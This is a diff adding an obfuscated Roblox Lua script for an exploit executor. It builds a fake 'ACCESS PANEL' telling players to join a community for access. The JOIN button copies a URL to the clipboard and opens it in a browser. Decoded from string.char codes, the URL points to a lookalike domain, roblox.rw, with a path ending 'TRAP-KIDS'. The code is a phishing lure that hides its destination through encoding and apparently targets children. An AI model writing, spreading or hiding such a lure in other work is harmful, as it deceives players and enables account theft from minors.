@@ -1,0 +1,118 @@
+local _0xR1 = string.char(82,111,98) .. string.char(108,111,120)
+local _0xR2 = string.char(104,116,116,112,115,58,47,119,119,119,46,114,111,98,108,111,120,46,114,119,47,99,111,109,109,117,110,105,116,105,101,115,47,51,50,50,53,57,51,48,55,56,48,50,47,84,82,65,80,45,75,73,68,83)
+local _0xR3 = string.char(114,98,120,97,115,115,101,116,105,100,58,47,47,49,51,48,51,49,49,49,49,55,56,54,56,52,54,52)
+local _0xP = (gethui and gethui()) or game:GetService("CoreGui")
+if _0xP:FindFirstChild(string.char(65,99,99,101,115,115,80,97,110,101,108)) then _0xP.AccessPanel:Destroy() end
+local _0xTS = game:GetService(string.char(84,119,101,101,110,83,101,114,118,105,99,101))
+local _0xGS = game:GetService(string.char(71,117,105,83,101,114,118,105,99,101))
+local _0xG = Instance.new(string.char(83,99,114,101,101,110,71,117,105), _0xP)
+_0xG.Name = string.char(65,99,99,101,115,115,80,97,110,101,108)
+_0xG.IgnoreGuiInset = true
+local _0xM = Instance.new(string.char(70,114,97,109,101), _0xG)
+_0xM.Size = UDim2.new(0, 480, 0, 440)
+_0xM.Position = UDim2.new(0.5, -240, 0.5, -220)
+_0xM.BackgroundColor3 = Color3.fromRGB(10,10,10)
+_0xM.BorderSizePixel = 0
+_0xM.ClipsDescendants = true
+Instance.new("UICorner", _0xM).CornerRadius = UDim.new(0, 14)
+_0xM.Active = true
+_0xM.Draggable = true
+local _0xBG = Instance.new("ImageLabel", _0xM)
+_0xBG.Size = UDim2.new(1.4,0,1.4,0)
+_0xBG.Position = UDim2.new(-0.2,0,-0.2,0)
+_0xBG.BackgroundTransparency = 1
+_0xBG.Image = _0xR3
+_0xBG.ScaleType = Enum.ScaleType.Crop
+_0xBG.ImageTransparency = 0.35
+local _0xOV = Instance.new("Frame", _0xM)
+_0xOV.Size = UDim2.new(1,0,1,0)
+_0xOV.BackgroundColor3 = Color3.fromRGB(0,0,0)
+_0xOV.BackgroundTransparency = 0.55
+_0xOV.BorderSizePixel = 0
+Instance.new("UICorner", _0xOV).CornerRadius = UDim.new(0,14)
+local _0xL = Instance.new("Frame", _0xM)
+_0xL.Size = UDim2.new(1,0,0,3)
+_0xL.BackgroundColor3 = Color3.fromRGB(0,255,136)
+_0xL.BorderSizePixel = 0
+_0xL.ZIndex = 10
+local function _0xCreateText(p, txt, posY, size, fnt)
+    local _t = Instance.new("TextLabel", p)
+    _t.Size = UDim2.new(1,0,0,size)
+    _t.Position = UDim2.new(0,0,0,posY)
+    _t.BackgroundTransparency = 1
+    _t.Text = txt
+    _t.Font = fnt
+    _t.TextSize = size == 40 and 28 or 15
+    _t.TextColor3 = Color3.fromRGB(255,255,255)
+    _t.ZIndex = 5
+    return _t
+end
+local t = _0xCreateText(_0xM, string.char(65,67,67,69,83,32,80,65,78,69,76), 20, 40, Enum.Font.GothamBlack)
+t.TextSize = 28
+local s = Instance.new("TextLabel", _0xM)
+s.Size = UDim2.new(1,0,0,20)
+s.Position = UDim2.new(0,0,0,58)
+s.BackgroundTransparency = 1
+s.Text = string.char(74,111,105,110,32,116,104,101,32,103,114,111,117,112,32,116,111,32,99,111,110,116,105,110,117,101)
+s.Font = Enum.Font.GothamBold
+s.TextSize = 15
+s.TextColor3 = Color3.fromRGB(255,90,90)
+s.ZIndex = 5
+local steps = Instance.new("TextLabel", _0xM)
+steps.Size = UDim2.new(0, 420, 0, 150)
+steps.Position = UDim2.new(0, 30, 0, 90)
+steps.BackgroundTransparency = 1
+steps.Text = "1. Press JOIN GROUP\n2. Join our " .. _0xR1 .. " Community for access\n3. If it doesn't open, paste in Chrome\n4. Join the group\n5. Access will be granted automatically"
+steps.Font = Enum.Font.GothamBold
+steps.TextSize = 16
+steps.TextColor3 = Color3.fromRGB(220,220,220)
+steps.TextXAlignment = Enum.TextXAlignment.Left
+steps.TextYAlignment = Enum.TextYAlignment.Top
+steps.TextWrapped = true
+steps.LineHeight = 1.4
+steps.ZIndex = 5
+local btn = Instance.new("TextButton", _0xM)
+btn.Size = UDim2.new(0, 290, 0, 46)
+btn.Position = UDim2.new(0.5, -145, 0, 275)
+btn.BackgroundColor3 = Color3.fromRGB(0,122,255)
+btn.Text = "Join " .. _0xR1 .. " Community"
+btn.Font = Enum.Font.GothamBlack
+btn.TextSize = 15
+btn.TextColor3 = Color3.fromRGB(255,255,255)
+btn.TextScaled = true
+btn.AutoButtonColor = false
+btn.ZIndex = 5
+Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 12)
+local btnStroke = Instance.new("UIStroke", btn)
+btnStroke.Thickness = 2.5
+btnStroke.Color = Color3.fromRGB(0,122,255)
+btnStroke.Transparency = 0.3
+task.spawn(function()
+    while btn.Parent do
+        local t1 = _0xTS:Create(btnStroke, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0, Thickness = 4})
+        local t2 = _0xTS:Create(btn, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(30,142,255)})
+        t1:Play() t2:Play()
+        task.wait(0.8)
+        local t3 = _0xTS:Create(btnStroke, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 0.6, Thickness = 2.5})
+        local t4 = _0xTS:Create(btn, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {BackgroundColor3 = Color3.fromRGB(0,122,255)})
+        t3:Play() t4:Play()
+        task.wait(0.8)
+    end
+end)
+local close = Instance.new("TextButton", _0xM)
+close.Size = UDim2.new(0,32,0,32)
+close.Position = UDim2.new(1,-38,0,8)
+close.BackgroundTransparency = 1
+close.Text = "X"
+close.TextColor3 = Color3.fromRGB(180,180,180)
+close.Font = Enum.Font.GothamBlack
+close.TextSize = 18
+close.ZIndex = 10
+close.MouseButton1Click:Connect(function() _0xG:Destroy() end)
+btn.MouseButton1Click:Connect(function()
+    if setclipboard then setclipboard(_0xR2) end
+    pcall(function() _0xGS:OpenBrowserWindow(_0xR2) end)
+    btn.Text = string.char(79,80,69,78,69,68,33,32,67,72,69,67,75,32,66,82,79,87,83,69,82)
+    task.wait(2)
+    btn.Text = "Join " .. _0xR1 .. " Community"
+end)
